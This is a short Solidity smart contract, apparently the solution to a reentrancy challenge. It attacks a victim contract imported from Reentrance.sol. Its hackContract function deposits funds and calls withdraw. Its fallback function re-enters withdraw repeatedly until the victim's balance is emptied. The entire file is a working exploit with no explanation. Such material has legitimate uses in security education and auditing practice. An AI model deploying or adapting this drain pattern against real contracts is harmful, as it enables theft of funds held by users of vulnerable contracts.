// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance victimContract = Reentrance(contractAddress);
        victimContract.donate{value: address(this).balance}(address(this));
        victimContract.withdraw();
    }

    fallback() external payable {
        Reentrance victimContract = Reentrance(contractAddress);
        if(contractAddress.balance > 0) {
        victimContract.withdraw();
        }
    }
}
